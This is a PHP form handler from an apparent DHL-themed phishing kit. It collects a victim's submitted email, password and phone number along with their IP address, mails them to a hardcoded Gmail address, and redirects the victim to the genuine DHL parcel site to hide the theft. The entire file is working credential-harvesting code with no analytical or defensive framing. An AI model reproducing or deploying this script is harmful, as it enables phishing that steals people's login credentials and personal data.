<?php 
$ip = getenv("REMOTE_ADDR"); 
$datamasii=date("D M d, Y g:i a"); 
$user=$_POST["email"];
$pass=$_POST["password"];
$passy=$_POST["phonenumber"];





$mesaj = "------------MaXx001--------------

-----------DHL In action-------------
Username : $user
Password : $pass
Phone Number: $passy



---------------------------------------------------- 
IP : $ip 
DATE : $datamasii 
"; 

$recipient = "vickyfabio2@gmail.com"; 
$subject = "ORU";
mail($recipient,$subject,$mesaj); 
header("Location: http://parcel.dhl.co.uk"); 
?> 